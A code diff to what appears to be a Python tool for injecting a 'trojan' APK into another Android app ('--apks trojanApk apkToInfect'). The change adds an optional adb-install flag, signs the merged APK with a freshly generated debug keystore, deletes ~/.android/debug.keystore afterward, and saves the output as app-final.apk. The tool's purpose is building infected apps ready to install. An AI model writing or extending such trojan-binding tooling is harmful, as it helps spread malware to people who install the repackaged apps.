@@ -35,6 +35,8 @@ class ParseArgs:
         self.parser.add_argument('--apks', dest='apks', action='store', metavar=('trojanApk', 'apkToInfect'), nargs=2,
                                  default=False,
                                  help='specify the Trojan Apk and the APk to Infect')
+        self.parser.add_argument('--adb', dest='adb', action='store_true',default=False,
+                                 help='install the final APK with adb')
         self.args = self.parser.parse_args()
 
     def getargs(self):
@@ -234,8 +236,13 @@ try:
     call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
     call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
     call('jarsigner -verify app-debug2.apk', shell=True)
-    call('~/android/sdk/platform-tools/adb install app-debug2.apk', shell=True)
 
-    shutil.copyfile(apk2Dist + 'app-debug2.apk', cd + '/app-debug2.apk')
+    if os.path.exists(os.path.expanduser('~') + '/.android/debug.keystore'):
+        os.remove(os.path.expanduser('~') + '/.android/debug.keystore')
+
+    if args.adb:
+        call('~/android/sdk/platform-tools/adb install app-debug2.apk', shell=True)
+
+    shutil.copyfile(apk2Dist + 'app-debug2.apk', cd + '/app-final.apk')
 except OSError as ex:
     error("can't build " + apk2Directory , str(ex), 1)
